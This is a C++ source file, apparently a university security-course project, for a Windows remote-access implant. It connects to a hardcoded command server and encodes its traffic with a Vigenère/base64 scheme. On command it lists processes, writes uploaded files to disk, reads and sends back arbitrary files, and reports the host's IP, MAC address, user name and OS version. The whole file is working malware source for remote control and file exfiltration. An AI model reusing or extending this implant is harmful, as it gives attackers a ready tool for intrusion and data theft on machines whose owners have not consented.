/*
* 
* File: Source.cpp
* Author: Russell Harvey
* 
* Facilitates networking, command execution, and coordinates all other necessary functionality for
* our CSEC-476 project.
* 
*/

#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <sal.h>
#include <fstream>
#include <windows.h>
#include <stdint.h>
#include <iphlpapi.h>
#include <sysinfoapi.h>
#include <sstream>
#include "vigCrypt.h"
#include "b64.h"

#pragma comment (lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma warning(disable : 4996)

using namespace std;

string get_proc_info(DWORD processID) {

	// Set vars for Proc Name
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
	string procName;

	// Get Proc Handle
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);

	// Get Proc Name
	if (NULL != hProcess)
	{
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
			&cbNeeded))
		{
			GetModuleBaseName(hProcess, hMod, szProcessName,
				sizeof(szProcessName) / sizeof(TCHAR));
		}
	}

	// Formatting stuff
	#ifndef UNICODE
		procName = szProcessName;
	#else
		std::wstring wStr = szProcessName;
		procName = std::string(wStr.begin(), wStr.end());
	#endif

	string output = "PID: " + std::to_string(processID) + "| EXE: " + procName + "\n";

	// Close Proc Handle
	CloseHandle(hProcess);

	return output;

}

string list_procs() {

	// Get PIDs.
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return string("Error: Could not enumerate procs");
	}

	// Calculate total PIDs
	cProcesses = cbNeeded / sizeof(DWORD);

	// Print the name and process identifier for each process, store in output
	string output = "";
	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			output.append(get_proc_info(aProcesses[i]));
		}
	}

	// Return output
	return output;

}

BOOL upload_file(string file_contents) {
	// Creates a fstream of the file
	fstream my_file;

	// Open the fstream, using a default name for simplicity sake
	my_file.open("uploaded_file", ios::out);

	// Write out file_contents using the fstream
	if (!my_file) {
		return FALSE;
	} else {
		cout << "File created successfully!";
		my_file << file_contents;
		my_file.close();
		// Return TRUE if successful
		return TRUE;
	}
	return FALSE;
}

string download_file(string file_name) {
	// Creates a fstream of the file
	fstream my_file;

	// Open the fstream, using a default name for simplicity sake
	my_file.open(file_name, ios::in);

	// Read in contents using the fstream
	if (!my_file) {
		return "FNF";
	}
	else {
		string contents;
		string temp;
		while (getline(my_file, temp)) {
			contents.append(temp + "\n");
		}
		my_file.close();
		// Once read, return the contents
		return contents;
	}
	return "FNF";
}

string get_MAC_addr()
{
	// Create a PIP_ADAPTER_INFO object 
	PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IP_ADAPTER_INFO));
	ULONG bufSz = sizeof(IP_ADAPTER_INFO);

	if (info)
	{
		// Check for Buffer Overflow
		if (GetAdaptersInfo(info, &bufSz) == ERROR_BUFFER_OVERFLOW)
		{
			info = (PIP_ADAPTER_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, info, bufSz);
		}

		if (info)
		{
			// Gets adapter info
			if (GetAdaptersInfo(info, &bufSz) == ERROR_SUCCESS)
			{
				// Get ptr to adapter
				PIP_ADAPTER_INFO ptr = info;
				while (ptr)
				{
					if (ptr->Type == MIB_IF_TYPE_ETHERNET || ptr->Type == IF_TYPE_IEEE80211)
					{
						// Create char* for address, use the ptr to insert each byte of the MAC address
						char* addr = (char*)malloc(18);
						sprintf(addr, "%02X:%02X:%02X:%02X:%02X:%02X",
							ptr->Address[0], ptr->Address[1],
							ptr->Address[2], ptr->Address[3],
							ptr->Address[4], ptr->Address[5]);
						// Convert char* addr to C++ string
						std::string mac = addr;
						// Return MAC address
						return mac;

					}
					ptr = ptr->Next;
				}
			}

			HeapFree(GetProcessHeap(), 0, info);
		}
	}
	return "";
}

string get_ip_addr()
{
	// Create a PIP_ADAPTER_INFO object 
	PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IP_ADAPTER_INFO));
	ULONG bufSz = sizeof(IP_ADAPTER_INFO);
	if (info)
	{
		// Error check for Buffer Overflow
		if (GetAdaptersInfo(info, &bufSz) == ERROR_BUFFER_OVERFLOW)
		{
			info = (PIP_ADAPTER_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, info, bufSz);
		}
		if (info)
		{
			// Get adapter info
			if (GetAdaptersInfo(info, &bufSz) == ERROR_SUCCESS)
			{
				PIP_ADAPTER_INFO ptr = info;
				while (ptr)
				{
					if (ptr->Type == MIB_IF_TYPE_ETHERNET || ptr->Type == IF_TYPE_IEEE80211)
					{
						// Get IP address and insert into a string variable
						string result = ptr->IpAddressList.IpAddress.String;

						HeapFree(GetProcessHeap(), 0, info);
						return result;
					}
					ptr = ptr->Next;
				}
			}
			HeapFree(GetProcessHeap(), 0, info);
		}
	}

	return "IP NOT FOUND";
}

string get_user() {
	// Uses GetUserNameA to retrieve username and returns it as a string
	char username[257];
	DWORD size = sizeof(username);
	GetUserNameA(username, &size);
	string user = username;
	return user;
}

string getOsName() {
	// Gets base OS that software is running on (should be Windows 32-bit or Windows 64-bit)
	#ifdef _WIN32
		return "Windows 32-bit";
	#elif _WIN64
		return "Windows 64-bit";
	#elif __APPLE__ || __MACH__
		return "Mac OSX";
	#elif __linux__
		return "Linux";
	#elif __FreeBSD__
		return "FreeBSD";
	#elif __unix || __unix__
		return "Unix";
	#else
		return "Other";
	#endif
}

string get_os() {
	// Gets major and minor Windows version and build number from GetVersionEX
	string content;
	content.append(getOsName());
	if (content == "Windows 32-bit" || content == "Windows 64-bit") {
		OSVERSIONINFO osver;
		osver.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		GetVersionEx(&osver);
		DWORD major;
		DWORD minor;
		DWORD build;
		major = osver.dwMajorVersion;
		minor = osver.dwMinorVersion;
		build = osver.dwBuildNumber;
		ostringstream majStream;
		ostringstream minStream;
		ostringstream buildStream;
		majStream << major;
		minStream << minor;
		buildStream << build;
		string majVer = majStream.str();
		string minVer = minStream.str();
		string buildVer = buildStream.str();
		content.append(" Version " + majVer + "." + minVer + " (" + buildVer + ")\n");
		return content;
	} else {
		return content;
	}
	return "";
}
	

string sys_info() {
	// Setup string
	string si;
	// IP
	string ip = get_ip_addr();
	si.append("IP Address: " + ip + "\n");
	// MAC
	string mac = get_MAC_addr();
	si.append("MAC Address: " + mac + "\n");
	// USER
	string user = get_user();
	si.append("User: " + user + "\n");
	// OS
	string os = get_os();
	si.append("Operating System: " + os + "\n");
	return si;
}

string encode_val(string val, vigCrypt crypt) {
	return crypt.encrypt(val);
}

string decode_val(string val, vigCrypt crypt) {
	return crypt.decrypt(val);
}

void main()
{

	string ipAddress = "127.0.0.1";			// IP Address of the server
	int port = 25565;						// Listening port # on the server

	// Initialze WinSock
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	int wsOk = WSAStartup(ver, &wsData);
	if (wsOk != 0)
	{
		cerr << "Can't Initialize winsock! Quitting" << endl;
		return;
	}

	// Create a socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		cerr << "Can't create a socket! Quitting" << endl;
		return;
	}

	// Bind the IP address and port to a socket
	sockaddr_in binder;
	binder.sin_family = AF_INET;
	binder.sin_port = htons(port);
	inet_pton(AF_INET, ipAddress.c_str(), &binder.sin_addr);

	int conn = connect(sock, (sockaddr*)&binder, sizeof(binder));
	if (conn == SOCKET_ERROR) {
		printf("Could not connect to server...\n");
		char buffer[256];
		snprintf(buffer, 256, "%d\n", WSAGetLastError());
		printf(buffer);
		closesocket(sock);
		WSACleanup();
		return;
	}
	
	cout << "Connected to Python server...\n";

	// Set-up encoded channel (Viginere/Custome B64)
	char key_buf[1028];
	int keyBytesReceived = recv(sock, key_buf, 1028, 0);
	string enc_key;
	if (keyBytesReceived > 0)
	{
		enc_key = string(key_buf, 0, keyBytesReceived);
	}
	string key = base64_decode(enc_key);
	vigCrypt crypt(key);

	// Open loop to listen to requests from Python server...
	BOOL running = TRUE;
	while (running) {
		char buffer[4096];
		int bytesReceived = recv(sock, buffer, 4096, 0);
		if (bytesReceived > 0)
		{
			string resp = decode_val(string(buffer, 0, bytesReceived), crypt);
			if (resp == string("list_procs")) {
				string procs = encode_val(list_procs(), crypt);
				_Post_ _Notnull_ char *proc_list = (char*)malloc(procs.size() + 1);
				memcpy(proc_list, procs.c_str(), procs.size() + 1);
				send(sock, proc_list, strlen(proc_list), 0);
				free(proc_list);
			}
			if (resp == string("upload_file")) {
				char upload_buffer[4096];
				int uploadBytesReceived = recv(sock, upload_buffer, 4096, 0);
				if (bytesReceived > 0) {
					string upload_resp = decode_val(string(upload_buffer, 0, uploadBytesReceived), crypt);
					BOOL result = upload_file(upload_resp);
					if (result) {
						string succ = encode_val("Success! File has been uploaded", crypt);
						cout << succ;
						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
						send(sock, succ_succ, strlen(succ_succ), 0);
						free(succ_succ);
					}
					else {
						string succ = encode_val("Failure! File has not been uploaded", crypt);
						cout << succ;
						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
						send(sock, succ_succ, strlen(succ_succ), 0);
						free(succ_succ);
					}
				} else {
					string succ = encode_val("Failure! File has not been uploaded", crypt);
					cout << succ;
					_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
					memcpy(succ_succ, succ.c_str(), succ.size() + 1);
					send(sock, succ_succ, strlen(succ_succ), 0);
					free(succ_succ);
				}
			}
			if (resp == string("download_file")) {
				char download_buffer[4096];
				int downloadBytesReceived = recv(sock, download_buffer, 4096, 0);
				if (bytesReceived > 0) {
					string download_resp = decode_val(string(download_buffer, 0, downloadBytesReceived), crypt);
					string result = download_file(download_resp);
					if (result != "FNF") {
						result = encode_val(result, crypt);
						_Post_ _Notnull_ char* succ_succ = (char*)malloc(result.size() + 1);
						memcpy(succ_succ, result.c_str(), result.size() + 1);
						send(sock, succ_succ, strlen(succ_succ), 0);
						free(succ_succ);
					}
					else {
						string succ = encode_val("Failure! File has not been downloaded", crypt);
						cout << succ;
						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
						send(sock, succ_succ, strlen(succ_succ), 0);
						free(succ_succ);
					}
				}
				else {
					string succ = encode_val("Failure! File has not been downloaded", crypt);
					cout << succ;
					_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
					memcpy(succ_succ, succ.c_str(), succ.size() + 1);
					send(sock, succ_succ, strlen(succ_succ), 0);
					free(succ_succ);
				}
			}
			if (resp == string("sys_info")) {
				string info = encode_val(sys_info(), crypt);
				_Post_ _Notnull_ char* info_report = (char*)malloc(info.size() + 1);
				memcpy(info_report, info.c_str(), info.size() + 1);
				send(sock, info_report, strlen(info_report), 0);
				free(info_report);
			}
			if (resp == string("exit")) {
				running = FALSE;
			}
			cout << "SERVER> " << resp << endl;
		}
	}

	// Close the socket
	closesocket(sock);

	// Cleanup winsock
	WSACleanup();
}
